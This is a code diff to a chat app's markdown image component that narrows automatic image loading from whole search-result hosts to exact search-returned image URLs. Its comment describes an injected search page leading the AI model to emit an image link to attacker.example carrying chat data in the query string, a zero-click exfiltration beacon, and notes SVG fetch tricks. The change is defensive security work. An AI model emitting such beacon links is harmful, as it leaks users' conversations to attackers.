@@ -15,10 +15,13 @@ import { cn } from '@/lib/utils'
  * same rule (`MarkdownImagePolicy.tapToLoadRemote`).
  *
  * What loads without a tap: a `data:` URL whose MIME is a raster image type,
- * the app's own media route (loopback only), and an `https:` image whose
- * host is one of the run's own web-search results — already trusted enough
- * to be cited. Everything else — an `http:` (non-TLS) remote image even from
- * a search-result host, a `data:` URL that is not a recognised raster type
+ * the app's own media route (loopback only), and an `https:` image URL the
+ * run's own web search returned, exactly (a result's thumbnail or favicon,
+ * an image or video result's image or thumbnail). Trusting a result's *host*
+ * would not do: the page that injects the instruction is itself a search
+ * result, so `![](https://attacker.example/p.png?d=<chat data>)` — or a Google
+ * Forms GET on `docs.google.com` — would load with no click. Everything else
+ * — any other URL on the same host, an `http:` (non-TLS) image, a `data:` URL that is not a recognised raster type
  * (an SVG rendered as `<img>` still resolves `<image href>`, `feImage` and
  * `url()` references as its own image fetches — a zero-click exfiltration
  * beacon — and any other or missing MIME, or a malformed `data:` URL, get the
@@ -56,13 +59,14 @@ function isRasterDataUrl(src: string): boolean {
   return mime !== null && RASTER_DATA_IMAGE_TYPES.has(mime)
 }
 
-// Provided by `Markdown` from the run's `webSearchResults` prop, in its own
+// Provided by `Markdown` from the run's `webSearchResults` prop (the exact
+// image URLs, normalized by `new URL().href`), in its own
 // context rather than through the ReactMarkdown `components` map: threading
 // it through `components` would give that object a new identity whenever
 // search results streamed in, which would invalidate every memoized block in
 // the document (see markdown-citations.tsx's `WebSearchRankMapContext`,
 // which exists for the same reason).
-export const AllowedImageHostsContext =
+export const AllowedImageUrlsContext =
   createContext<ReadonlySet<string> | null>(null)
 
 function hostnameOf(src: string): string | null {
@@ -73,35 +77,50 @@ function hostnameOf(src: string): string | null {
   }
 }
 
-/** The hosts a run's own web search already surfaced — safe to auto-load. */
-export function allowedImageHosts(
+/** `src` as an `https:` URL in `URL.href` form, or null. */
+function httpsHref(src: string | undefined): string | null {
+  if (!src) return null
+  try {
+    const url = new URL(src)
+    return url.protocol === 'https:' ? url.href : null
+  } catch {
+    return null
+  }
+}
+
+/** The exact image URLs a run's own web search returned — safe to
+ *  auto-load. Never the result pages or their hosts. */
+export function allowedImageUrls(
   webSearchResults: WebSearchResult[] | undefined
 ): ReadonlySet<string> | null {
   if (!webSearchResults || webSearchResults.length === 0) return null
-  const hosts = new Set<string>()
-  for (const result of webSearchResults) {
-    const host = result.hostname || hostnameOf(result.link)
-    if (host) hosts.add(host)
+  const urls = new Set<string>()
+  const add = (src: string | undefined) => {
+    const href = httpsHref(src)
+    if (href) urls.add(href)
   }
-  return hosts.size > 0 ? hosts : null
+  for (const result of webSearchResults) {
+    add(result.thumbnail)
+    add(result.favicon)
+    for (const media of result.media ?? []) {
+      if (media.kind === 'image') add(media.url)
+      add(media.thumbnailUrl)
+    }
+  }
+  return urls.size > 0 ? urls : null
 }
 
-/** A `data:` URL, the app's own media route, or an `https:` image from one
- *  of `allowedHosts` — loads without asking. */
+/** A `data:` URL, the app's own media route, or an `https:` image URL in
+ *  `allowedUrls` — loads without asking. */
 export function loadsAutomatically(
   src: string,
-  allowedHosts: ReadonlySet<string> | null
+  allowedUrls: ReadonlySet<string> | null
 ): boolean {
   if (isRasterDataUrl(src)) return true
   if (src.startsWith(MEDIA_ROUTE_PREFIX)) return true
-  if (!allowedHosts) return false
-  let url: URL
-  try {
-    url = new URL(src)
-  } catch {
-    return false
-  }
-  return url.protocol === 'https:' && allowedHosts.has(url.hostname)
+  if (!allowedUrls) return false
+  const href = httpsHref(src)
+  return href !== null && allowedUrls.has(href)
 }
 
 // Every `src` the user has chosen to load, for the life of the renderer
@@ -123,7 +142,7 @@ export function RemoteImage({
   [key: string]: unknown
 }) {
   const { t } = useTranslation('chat')
-  const allowedHosts = useContext(AllowedImageHostsContext)
+  const allowedUrls = useContext(AllowedImageUrlsContext)
   // Only used to force a re-render after a click; `loaded` itself is always
   // read fresh from the module-level Set below, never cached in state — the
   // same `src` position can carry a different URL frame to frame while a
@@ -132,7 +151,7 @@ export function RemoteImage({
 
   const loaded =
     src !== undefined &&
-    (loadsAutomatically(src, allowedHosts) || loadedRemoteImages.has(src))
+    (loadsAutomatically(src, allowedUrls) || loadedRemoteImages.has(src))
 
   if (!src || loaded) {
     return (
